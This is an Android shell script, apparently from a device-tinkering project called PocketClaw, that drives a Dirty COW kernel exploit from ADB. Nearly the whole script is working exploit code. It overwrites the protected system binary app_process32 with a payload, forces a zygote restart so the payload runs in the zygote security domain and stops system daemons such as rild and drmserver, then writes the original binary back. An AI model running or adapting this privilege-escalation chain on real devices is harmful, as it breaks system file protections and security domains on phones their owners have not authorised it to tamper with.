#!/system/bin/sh
# PocketClaw daemon stopper — runs from ADB shell after reboot.
# Requires: dirtycow, payload, app_process32.orig in /data/local/tmp/
#
# Sequence:
# 1. am hang --allow-restart (while app_process32 is still original)
# 2. Dirty COW app_process32 with payload
# 3. Background restorer watches for zygote PID change
# 4. Watchdog triggers (~60-120s), init restarts zygote
# 5. Payload runs in zygote domain, stops daemons via ctl.stop
# 6. Restorer detects PID change, Dirty COWs original back (~12s)
# 7. Payload exits, init restarts zygote with clean binary

DIRTYCOW=/data/local/tmp/dirtycow
PAYLOAD=/data/local/tmp/payload
ORIG=/data/local/tmp/app_process32.orig
TARGET=/system/bin/app_process32

# Sanity check
for f in "$DIRTYCOW" "$PAYLOAD" "$ORIG"; do
    if [ ! -f "$f" ]; then
        echo "MISSING: $f"
        exit 1
    fi
done

# Get current zygote PID via /proc
ORIG_PID=""
for p in $(ls /proc | grep '^[0-9]'); do
    if [ -f /proc/$p/cmdline ]; then
        CMD=$(cat /proc/$p/cmdline 2>/dev/null | tr '\0' ' ')
        case "$CMD" in
            *zygote*)
                ORIG_PID=$p
                break
                ;;
        esac
    fi
done
if [ -z "$ORIG_PID" ]; then
    echo "Cannot find zygote PID"
    exit 1
fi
echo "Zygote PID: $ORIG_PID"

# Check which daemons are running before
echo "Daemons before:"
ps | grep -E 'drmserver|mm-qcamera|audiod|rild' | grep -v grep

# Step 1: Hang system (BEFORE COW — am needs working app_process32)
echo ""
echo "Step 1: am hang --allow-restart..."
am hang --allow-restart &
AM_PID=$!
sleep 2

# Step 2: Dirty COW app_process32 with payload
echo "Step 2: Dirty COW app_process32..."
$DIRTYCOW "$TARGET" "$PAYLOAD"
echo "COW done. Waiting for watchdog to kill zygote PID $ORIG_PID..."

# Step 3: Background restorer — polls /proc/$ORIG_PID existence
(
    echo "Restorer: watching /proc/$ORIG_PID..."
    while [ -d /proc/$ORIG_PID ]; do
        sleep 2
    done
    echo "Restorer: /proc/$ORIG_PID gone — watchdog triggered"
    sleep 5
    echo "Restorer: restoring app_process32..."
    $DIRTYCOW "$TARGET" "$ORIG"
    echo "Restorer: done."
) &
RESTORER_PID=$!

# Step 4: Wait for the whole sequence to complete
WAITED=0
while [ $WAITED -lt 240 ]; do
    if ! kill -0 $RESTORER_PID 2>/dev/null; then
        echo "Restorer finished after ${WAITED}s."
        break
    fi
    if [ $((WAITED % 30)) -eq 0 ] && [ $WAITED -gt 0 ]; then
        echo "  ...waiting (${WAITED}s elapsed)"
    fi
    sleep 5
    WAITED=$((WAITED + 5))
done

if kill -0 $RESTORER_PID 2>/dev/null; then
    echo "TIMEOUT: restorer still running after 240s. Killing."
    kill $RESTORER_PID 2>/dev/null
fi

# Cleanup
kill $AM_PID 2>/dev/null || true

# Verify — wait for real zygote to come back
echo ""
echo "Waiting for real zygote to restart..."
VWAIT=0
while [ $VWAIT -lt 60 ]; do
    FINAL_PID=""
    for p in $(ls /proc | grep '^[0-9]'); do
        CMD=$(cat /proc/$p/cmdline 2>/dev/null | tr '\0' ' ')
        case "$CMD" in
            *zygote*)
                FINAL_PID=$p
                break
                ;;
        esac
    done
    if [ -n "$FINAL_PID" ] && [ "$FINAL_PID" != "$ORIG_PID" ]; then
        break
    fi
    sleep 2
    VWAIT=$((VWAIT + 2))
done

echo "=== RESULTS ==="
echo "Zygote PID: $ORIG_PID -> ${FINAL_PID:-NONE}"
echo "Daemons after:"
ps | grep -E 'drmserver|mm-qcamera|audiod|rild' | grep -v grep || echo "  (none running)"
echo "Done."
